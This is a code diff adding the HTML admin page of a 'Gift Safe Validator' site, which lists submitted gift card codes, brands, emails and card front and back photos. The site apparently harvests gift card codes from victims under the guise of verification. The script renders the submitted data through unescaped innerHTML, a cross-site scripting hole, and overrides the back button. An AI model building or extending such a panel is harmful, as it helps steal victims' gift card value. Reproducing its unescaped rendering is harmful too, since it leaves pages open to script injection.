@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Admin - Gift Safe Validator</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}" />
+  </head>
+  <body>
+    <div class="bg">
+      <div class="bg-photo"></div>
+      <div class="bg-glow glow-1"></div>
+      <div class="bg-glow glow-2"></div>
+      <div class="bg-noise"></div>
+    </div>
+
+    <main class="container">
+      <header class="header">
+        <div class="brand">
+          <div class="logo-wrap" aria-hidden="true">
+            <svg class="logo-icon" viewBox="0 0 64 64" role="img" aria-hidden="true">
+              <path d="M12 26h40v26a6 6 0 0 1-6 6H18a6 6 0 0 1-6-6V26z" />
+              <path d="M8 26h48v10H8z" />
+              <path d="M32 26v32" />
+              <path d="M22 26c-5 0-10-4-10-9s5-9 10-9c6 0 10 6 10 12-4-4-6-6-10-6z" />
+              <path d="M42 26c5 0 10-4 10-9s-5-9-10-9c-6 0-10 6-10 12 4-4 6-6 10-6z" />
+              <path d="M26 44l4 4 8-10" />
+            </svg>
+            <span class="pulse-ring"></span>
+          </div>
+          <div class="brand-text">
+            <h1>Gift Safe Validator</h1>
+            <p class="sub">Admin dashboard</p>
+          </div>
+        </div>
+
+        <nav class="nav"></nav>
+
+        <div class="header-actions">
+          <a class="ghost-btn" href="/">Back to site</a>
+        </div>
+      </header>
+
+      <section class="verify-section">
+        <div class="card">
+          <div class="card-head">
+            <h3>Recent Verifications</h3>
+            <p class="muted small">Codes submitted from the main page are listed here.</p>
+          </div>
+
+          <div class="admin-table">
+            <div class="admin-row admin-head">
+              <div>Time</div>
+            <div>Brand</div>
+            <div>Code</div>
+            <div>Email</div>
+            <div>Images</div>
+          </div>
+          <div id="adminRows" class="admin-rows"></div>
+        </div>
+        </div>
+      </section>
+    </main>
+
+    <div id="toast" class="toast" role="status" aria-live="polite"></div>
+
+    <script>
+      const rows = document.getElementById("adminRows");
+      const toast = document.getElementById("toast");
+
+      function showToast(msg){
+        toast.textContent = msg;
+        toast.classList.add("show");
+        clearTimeout(showToast._t);
+        showToast._t = setTimeout(() => toast.classList.remove("show"), 2200);
+      }
+
+      function getLogs(){
+        try{
+          return JSON.parse(localStorage.getItem("adminLogs") || "[]");
+        }catch(e){
+          return [];
+        }
+      }
+
+      function renderLogs(){
+        const logs = getLogs();
+        rows.innerHTML = "";
+        if(!logs.length){
+          const empty = document.createElement("div");
+          empty.className = "empty-state";
+          empty.innerHTML = '<div class="empty-icon">Inbox</div><p class="muted">No submissions yet.</p>';
+          rows.appendChild(empty);
+          return;
+        }
+        logs.slice().reverse().forEach((log) => {
+          const row = document.createElement("div");
+          row.className = "admin-row";
+          const isImageCode = typeof log.code === "string" && log.code.startsWith("data:image/");
+          const codeCell = isImageCode
+            ? `
+              <div class="admin-images">
+                <img src="${log.code}" alt="Scan" />
+              </div>
+            `
+            : `
+              <div style="font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', monospace;">
+                ${log.code || "-"}
+              </div>
+            `;
+          const images = (log.front || log.back)
+            ? `
+              <div class="admin-images">
+                ${log.front ? `<img src="${log.front}" alt="Front" />` : ""}
+                ${log.back ? `<img src="${log.back}" alt="Back" />` : ""}
+              </div>
+            `
+            : "<div>-</div>";
+          row.innerHTML = `
+            <div>${log.time || "-"}</div>
+            <div style="font-weight:600;">${log.brand || "-"}</div>
+            ${codeCell}
+            <div>${log.email || "-"}</div>
+            ${images}
+          `;
+          rows.appendChild(row);
+        });
+      }
+
+      // Force back button to return to the main page.
+      window.history.pushState({ page: "admin" }, "", window.location.href);
+      window.addEventListener("popstate", () => {
+        window.location.href = "/";
+      });
+
+      renderLogs();
+    </script>
+  </body>
+</html>
